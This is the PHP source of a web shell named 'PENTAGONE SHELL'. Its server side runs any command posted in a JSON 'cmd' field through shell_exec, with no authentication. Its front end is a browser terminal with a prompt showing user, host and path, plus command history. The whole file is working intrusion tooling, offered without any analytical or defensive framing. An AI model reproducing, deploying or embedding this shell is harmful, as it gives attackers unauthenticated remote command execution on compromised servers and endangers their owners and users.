<?php

function escapetext($text) {
    return str_replace("\n", "<br>", htmlentities($text));
}

function exec_command($cmd, $internal = false) {
    try {
        $output = shell_exec($cmd);
        if ($internal) {
            return $output;
        }
        return json_encode([
            'status' => 'ok',
            'response' => escapetext($output)
        ]);
    } catch (Exception $e) {
        $errorResponse = [
            'status' => 'error',
            'response' => $e->getMessage()
        ];
        return $internal ? $e->getMessage() : json_encode($errorResponse);
    }
}

$postdata = json_decode(file_get_contents('php://input'));

if (!is_null($postdata) && isset($postdata->cmd)) {
    die(exec_command($postdata->cmd));
}

try {
    $hostvars = exec_command('whoami && hostname && pwd', true);
    list($whoami, $hostname, $pwd) = explode("\n", trim($hostvars));

    if (!$whoami || !$hostname || !$pwd) {
        throw new Exception('Could not retrieve necessary information.');
    }
} catch (Exception $e) {
    $errormsg = $e->getMessage();
}

?>
<!doctype html>
<html>
<head>
    <title>PENTAGONE SHELL - <?php echo isset($errormsg) ? 'Inactive' : 'Active'; ?></title>
    <style>
        body {
            background: #1e1e1e;
            color: #f8f8f8;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            height: 100vh;
        }
        #terminal {
            flex: 1;
            padding: 1em;
            overflow-y: auto;
            white-space: pre-wrap;
            word-break: break-word;
            background: #1e1e1e;
            color: #f8f8f8;
        }
        #bottombar {
            display: flex;
            align-items: center;
            padding: 1em;
            background: #111;
            border-top: 1px solid #333;
        }
        #ps1 {
            margin-right: 1em;
            color: #8f8;
        }
        #cursor {
            flex: 1;
            border: none;
            background: transparent;
            color: #f8f8f8;
            font-family: 'Courier New', Courier, monospace;
            outline: none;
        }
    </style>
</head>
<body>
    <?php if (isset($errormsg)): ?>
        <span><?php echo $errormsg; ?></span>
    <?php endif; ?>
    <pre id="terminal"></pre>
    <div id="bottombar">
        <span id="ps1"></span>
        <input id="cursor" autofocus>
    </div>
    <script>
        class Terminal {
            constructor() {
                this.whoami = '<?php echo $whoami; ?>';
                this.hostname = '<?php echo $hostname; ?>';
                this.pwd = '<?php echo $pwd; ?>';
                this.PATH_SEP = '/';
                this.commandHistory = [];
                this.commandHistoryIndex = this.commandHistory.length;

                this.termWindow = document.getElementById('terminal');
                this.cursor = document.getElementById('cursor');
                this.ps1element = document.getElementById('ps1');

                this.ps1element.innerHTML = this.ps1();

                this.attachCursor();
            }

            formatPath(path) {
                path = path.replace(/\//g, this.PATH_SEP);
                let curPathArr = !path.match(/^(([A-Z]\:)|(\/))/) ? this.pwd.split(this.PATH_SEP) : [];
                let pathArr = curPathArr.concat(path.split(this.PATH_SEP).filter(el => el));
                let absPath = [];

                pathArr.forEach(el => {
                    if (el === '..') {
                        absPath.pop();
                    } else if (el !== '.') {
                        absPath.push(el);
                    }
                });

                return this.PATH_SEP + (absPath.length === 1 ? absPath[0] + this.PATH_SEP : absPath.join(this.PATH_SEP));
            }

            getCurrentPath() {
                return this.formatPath(this.pwd);
            }

            updateCurrentPath(newPath) {
                this.pwd = this.formatPath(newPath);
            }

            attachCursor() {
                this.cursor.addEventListener('keyup', ({keyCode}) => {
                    switch (keyCode) {
                        case 13:
                            this.execCommand(this.cursor.value);
                            this.cursor.value = '';
                            this.ps1element.innerHTML = this.ps1();
                            this.commandHistoryIndex = this.commandHistory.length;
                            break;
                        case 38:
                            if (this.commandHistoryIndex > 0) {
                                this.cursor.value = this.commandHistory[--this.commandHistoryIndex] || '';
                            }
                            break;
                        case 40:
                            if (this.commandHistoryIndex < this.commandHistory.length - 1) {
                                this.cursor.value = this.commandHistory[++this.commandHistoryIndex] || '';
                            } else {
                                this.cursor.value = '';
                            }
                            break;
                    }
                });
            }

            ps1() {
                return `<span style="color:orange">${this.whoami}@${this.hostname}</span>:` +
                    `<span style="color:limegreen">${this.getCurrentPath()}</span>$ `;
            }

            execCommand(cmd) {
                if (cmd.trim() === 'clear') {
                    this.termWindow.innerHTML = '';
                } else {
                    this.commandHistory.push(cmd);
                    fetch(document.location.href, {
                        method: 'POST',
                        headers: new Headers({
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        }),
                        body: JSON.stringify({ cmd })
                    }).then(
                        res => res.json(),
                        err => console.error(err)
                    ).then(({response}) => {
                        this.termWindow.innerHTML += `${this.ps1()}${cmd}<br>${response}<br>`;
                        this.termWindow.scrollTop = this.termWindow.scrollHeight;
                    });
                }
            }
        }

        window.addEventListener('load', () => {
            new Terminal();
        });
    </script>
</body>
</html>
